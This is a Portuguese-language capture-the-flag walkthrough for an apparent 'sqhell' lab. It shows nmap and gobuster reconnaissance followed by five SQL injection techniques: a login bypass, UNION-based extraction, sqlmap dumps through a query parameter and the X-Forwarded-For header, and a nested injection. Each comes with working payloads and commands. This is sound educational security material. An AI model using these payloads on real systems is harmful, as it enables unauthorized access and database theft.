

### 1. Reconhecimento Inicial (Enumeration)

**Comando:**
```bash
nmap -p22,80 -sV -sC -Pn -T4 -oA 10.10.68.254 10.10.68.254
```

**O que foi feito:**
- **`-p22,80`**: Escaneou apenas as portas 22 (SSH) e 80 (HTTP).
- **`-sV`**: Detecção de versão de serviço (identificou OpenSSH 8.2p1 Ubuntu e nginx 1.18.0).
- **`-sC`**: Executou scripts padrão do Nmap (NSE) para descobrir mais informações.
- **`-Pn`**: Pulou a descoberta de host (assume que o host está online).
- **`-T4`**: Velocidade agressiva de scan.
- **`-oA`**: Salva saída em todos os formatos (normal, XML, greppable).

**Resultado:**
- Porta 22: OpenSSH → útil só com credenciais (descartado por enquanto).
- Porta 80: Nginx servindo uma página web chamada "Home".

**Próximo passo lógico:** Focar no serviço web (único exposto e promissor).

---

### 2. Descoberta de Diretórios (Directory Brute Forcing)

**Ferramenta:** Gobuster

**Encontrou:**
- `/login` (200)
- `/post` (200)
- `/register` (200)
- `/user` (200)

Isso indica que o site tem funcionalidades de autenticação, visualização de posts, registro e visualização de usuários.

---

### 3. Análise Manual da Página de Login + SQL Injection Básica

Acessou a página de login e testou credenciais padrão (sem sucesso).

Depois usou **Burp Suite** para capturar a requisição POST de login e enviou para o **Repeater**.

**Payload usado:**
```http
username=admin'+or+'1'%3d'1&password=password
```

**Explicação técnica:**

- `'admin'` + `' or '1'='1` → Fecha a string do username e injeta uma condição sempre verdadeira (`1=1`).
- O `'` no final fecha o SQL original.
- `%3d` é o encoding de `=`.

Isso é o clássico **SQL Injection Authentication Bypass**.

Quando o backend executa algo como:
```sql
SELECT * FROM users WHERE username = 'admin' or '1'='1' AND password = 'password'
```
A condição `or '1'='1'` torna a query verdadeira independentemente da senha.

**Resultado:** Login bypassado e flag obtida na resposta.

---

### 4. Análise da Página `/post`

**Observação:** Ao acessar `/post` aparece "Missing parameter: id".

Isso indica que a página usa um parâmetro `id` para buscar conteúdo no banco.

**Teste manual:**
```url
http://10.10.68.254/post?id=-1 union select 1,2,user(),4
```

**Explicação:**
- `-1` → Provavelmente não existe, para não retornar dados legítimos.
- `union select` → Une o resultado da query original com uma nova query controlada pelo atacante.
- `1,2,user(),4` → Testa quantas colunas a query original tem e injeta dados (incluindo a função `user()` do MySQL).

Isso confirma **SQL Injection UNION-based** na página `/post`.

---

### 5. Uso do sqlmap na página `/post`

**Passo:**
1. Capturou a requisição no Burp Suite.
2. Salvou como `sqhell_post.request`.
3. Executou:
```bash
sqlmap -r sqhell_post.request --dbms mysql -D sqhell_5 -T flag --dump
```

**Explicação de cada parâmetro:**
- `-r` → Usa arquivo de requisição HTTP (mantém cookies, headers, etc).
- `--dbms mysql` → Força o tipo de banco (acelera).
- `-D sqhell_5` → Especifica o database.
- `-T flag` → Especifica a tabela.
- `--dump` → Extrai todo o conteúdo da tabela.

**Resultado:** Flag extraída.

---

### 6. Página de Registro (`/register`)

**Problema encontrado:** Não permite registrar novos usuários.

**Descoberta:** Enquanto testava, o Burp capturou uma requisição para:
```
/register/user-check?username=a
```

Isso é um endpoint que verifica se o usuário já existe (provavelmente chamado via JavaScript/AJAX).

**Comando sqlmap:**
```bash
sqlmap -r sqhell_register.request --dbms mysql -D sqhell_3 -T flag --dump
```

Mesma lógica: injeta no parâmetro `username` do endpoint de verificação.

---

### 7. Página Terms and Conditions (SQLi via Header)

**Dica no site:** "We log your IP address for analytics purposes"

**Técnica:** SQL Injection via **X-Forwarded-For** (header usado para identificar IP do cliente quando há proxy/load balancer).

**Comando:**
```bash
sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://10.10.68.254/ -D sqhell_1 -T flag --dump
```

**Explicação:**
- `--headers` → Permite injetar payload dentro de um header HTTP.
- `1*` → O `*` é onde o sqlmap vai colocar os payloads de teste.

O backend provavelmente faz algo como:
```sql
INSERT INTO logs (ip) VALUES ('$X-Forwarded-For')
```
Sem sanitização → vulnerável a SQLi.

---

### 8. Página `/user` → SQL Injection Aninhada (Nested / Inception)

**Dificuldade:** SQLi normal não funcionava para extrair a flag.

**Dica:** "Well, dreams, they feel real while we're in them right?" → Referência ao filme *Inception*.

**Pesquisa:** "sql injection inception" → leva ao conceito de **Nested SQL Injection** (ou Second-Order / Multi-stage SQLi).

**Primeiro teste:**
```url
http://10.10.68.254/user?id=2 union all select 1,2,3 from users#
```
→ Consegue sobrescrever/injetar na query.

**Segundo estágio (Nested):**
```url
http://10.10.68.254/user?id=2 union all select "1 union select 1,flag,3,4 from flag-- -",1,2 from user#
```

**Explicação camada por camada:**

1. A query original da página `/user` é algo como:
   ```sql
   SELECT ... FROM users WHERE id = 2
   ```

2. O atacante injeta uma string que **se torna** uma nova query SQL quando o banco executa outra operação (provavelmente ao exibir o usuário ou ao fazer um JOIN/INSERT posterior).

3. O payload cria uma query que, quando interpretada novamente pelo banco, executa:
   ```sql
   union select 1,flag,3,4 from flag
   ```

Isso é **Nested SQL Injection**: o resultado da primeira injeção vira parte do código SQL de uma segunda query.

É uma técnica avançada e rara.

---

### Resumo das Camadas de Vulnerabilidade Encontradas

| Endpoint                  | Tipo de SQLi                     | Vetor de Injeção          | Nível     |
|--------------------------|----------------------------------|---------------------------|-----------|
| `/login`                 | Authentication Bypass            | Parâmetro username        | Básico    |
| `/post?id=`              | UNION-based                      | Parâmetro GET id          | Médio     |
| `/register/user-check`   | Error/Union-based                | Parâmetro username        | Médio     |
| `/terms-and-conditions`  | Via HTTP Header (X-Forwarded-For)| Header                    | Médio     |
| `/user?id=`              | Nested / Inception               | Parâmetro id (multi-stage)| Avançado  |

---
